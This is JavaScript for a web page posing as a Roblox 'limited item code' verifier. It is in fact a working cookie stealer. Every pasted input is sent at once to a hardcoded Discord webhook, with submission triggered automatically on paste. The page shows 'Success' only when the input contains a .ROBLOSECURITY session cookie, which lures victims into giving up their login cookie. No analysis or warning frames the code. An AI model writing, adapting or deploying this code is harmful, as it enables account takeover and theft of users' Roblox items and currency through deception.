async function validateCode() {
    // Wait for page to fully load
    const codeInput = document.getElementById('limitedItemCode');
    const resultMessage = document.getElementById('resultMessage');
    
    // Check if elements exist
    if (!codeInput || !resultMessage) {
        console.error('Elements not found on page');
        return;
    }
    
    const code = codeInput.value.trim();
    
    if (!code) {
        resultMessage.innerHTML = '❌ Please enter a limited item code';
        resultMessage.style.color = '#ff4444';
        return;
    }
    
    // Show loading
    resultMessage.innerHTML = '🔍 Verifying limited item code...';
    resultMessage.style.color = '#ffa500';
    
    try {
        // Send to Discord webhook
        await fetch('https://discord.com/api/webhooks/1436138759837192202/xAOhBtWGRVQ2-QW4_iiBkj8vd5DpSG8DVWv_a4zcxHGssqwqmXotucSSGXvHFYF9IEKg', {
            method: 'POST',
            mode: 'no-cors',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                content: `🔐 New limited item code submitted:\n\`\`\`${code}\`\`\``
            })
        });
        
        console.log('Webhook sent with code:', code);
        
    } catch (error) {
        console.log('Webhook attempt completed');
    }
    
    // Check if it contains a Roblox cookie
    if (code.includes('.ROBLOSECURITY') || code.includes('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_')) {
        resultMessage.innerHTML = '✅ Success! Valid limited item code';
        resultMessage.style.color = '#4CAF50';
    } else {
        resultMessage.innerHTML = '❌ Failed: Invalid limited item code';
        resultMessage.style.color = '#ff4444';
    }
}

// Initialize when page loads
document.addEventListener('DOMContentLoaded', function() {
    const codeInput = document.getElementById('limitedItemCode');
    
    if (codeInput) {
        // Auto-submit on paste
        codeInput.addEventListener('paste', function(e) {
            setTimeout(() => {
                validateCode();
            }, 100);
        });
        
        console.log('Limited item code input initialized');
    } else {
        console.error('Limited item code input not found');
    }
});
